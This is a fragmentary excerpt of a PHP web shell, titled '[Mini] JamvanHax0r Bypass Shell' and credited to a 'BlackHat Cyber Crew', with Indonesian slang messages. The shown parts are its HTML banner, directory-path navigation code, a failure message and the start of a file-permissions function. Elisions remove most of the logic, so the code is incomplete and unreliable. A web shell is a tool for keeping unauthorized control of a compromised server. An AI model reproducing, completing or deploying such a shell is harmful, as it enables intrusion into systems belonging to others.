...
<html>
<head>
<title>[Mini] JamvanHax0r Bypass Shell</title>
</head>';
...
echo '</head>
<body><b>
<H1><center><font color="white">Coded by JamvanHax0r</font> <font color="white">- BlackHat Cyber Crew</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ Posisi Kita Saat Ini Jon : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="red">Gagal Coeg!</font><br />';
}
}
...
echo '<br><center>&copy; 2021 by JamvanHax0r - BlackHat Cyber Crew</b></body>
</html>';
function perms($file){
